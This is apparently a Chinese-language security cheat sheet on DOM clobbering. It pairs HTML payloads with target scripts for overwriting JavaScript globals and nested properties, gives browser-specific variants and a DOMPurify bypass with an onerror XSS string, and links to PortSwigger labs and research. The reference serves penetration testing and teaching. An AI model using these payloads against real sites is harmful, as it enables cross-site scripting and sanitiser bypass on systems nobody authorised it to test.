# DOM 替换

> DOM 替换是一种技术，通过为某些具有特定 ID 或名称的 HTML 元素命名，可以覆盖或“替换”全局变量。这可能导致脚本中出现意外行为，并可能引发安全漏洞。

## 概述

- [工具](#工具)
- [方法论](#方法论)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - 针对移动和桌面浏览器的 DOM 替换有效负载综合列表
- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - 一款基于网络的工具，用于测试各种 HTML 解析器和过滤器
- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - 揭示浏览器如何解析 HTML 并发现变异的 XSS 漏洞

## 方法论

利用需要页面中存在任何形式的 `HTML 注入`。

- 替换 `x.y.value`

    ```html
    <!-- 有效负载 -->
    <form id=x><output id=y>我被替换了</output>

    <!-- 目标 -->
    <script>alert(x.y.value);</script>
    ```

- 使用 ID 和 name 属性一起替换 `x.y`，形成 DOM 集合

    ```html
    <!-- 有效负载 -->
    <a id=x><a id=x name=y href="被替换了">

    <!-- 目标 -->
    <script>alert(x.y)</script>
    ```

- 替换 `x.y.z` - 三层深度

    ```html
    <!-- 有效负载 -->
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    <!-- 目标 -->
    <script>alert(x.y.z)</script>
    ```

- 替换 `a.b.c.d` - 超过三层

    ```html
    <!-- 有效负载 -->
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:被替换了>测试</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    <!-- 目标 -->
    <script>alert(a.b.c.d)</script>
    ```

- 替换 `forEach`（仅限 Chrome）

    ```html
    <!-- 有效负载 -->
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    <!-- 目标 -->
    <script>x.y.forEach(element=>alert(element))</script>
    ```

- 使用 `<html>` 或 `<body>` 标签替换 `document.getElementById()`，这些标签具有相同的 `id` 属性

    ```html
    <!-- 有效负载 -->
    <html id="cdnDomain">被替换了</html>
    <svg><body id=cdnDomain>被替换了</body></svg>


    <!-- 目标 -->
    <script>
    alert(document.getElementById('cdnDomain').innerText);//被替换了
    </script>
    ```

- 替换 `x.username`

    ```html
    <!-- 有效负载 -->
    <a id=x href="ftp:被替换了-用户名:被替换了-密码@a">

    <!-- 目标 -->
    <script>
    alert(x.username)//被替换了-用户名
    alert(x.password)//被替换了-密码
    </script>
    ```

- 替换（仅限 Firefox）

    ```html
    <!-- 有效负载 -->
    <base href=a:abc><a id=x href="Firefox<>">

    <!-- 目标 -->
    <script>
    alert(x)//Firefox<>
    </script>
    ```

- 替换（仅限 Chrome）

    ```html
    <!-- 有效负载 -->
    <base href="a://被替换了<>"><a id=x name=x><a id=x name=xyz href=123>

    <!-- 目标 -->
    <script>
    alert(x.xyz)//a://被替换了<>
    </script>
    ```

## 技巧

- DomPurify 允许协议 `cid:`，并且不会对双引号 (`"`) 进行编码：`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

## 实验室

- [PortSwigger - 利用 DOM 替换启用 XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [PortSwigger - 替换 DOM 属性以绕过 HTML 过滤器](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [PortSwigger - 受 CSP 保护的 DOM 替换测试案例](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## 参考文献

- [通过 DOM 替换绕过 CSP - Gareth Heyes - 2023年6月5日](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM 替换 - HackTricks - 2023年1月27日](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOM 替换 - PortSwigger - 2020年9月25日](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM 替换卷土重来 - Gareth Heyes - 2020年2月6日](https://portswigger.net/research/dom-clobbering-strikes-back)
- [通过 DOM 替换劫持服务工作者 - Gareth Heyes - 2022年11月29日](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)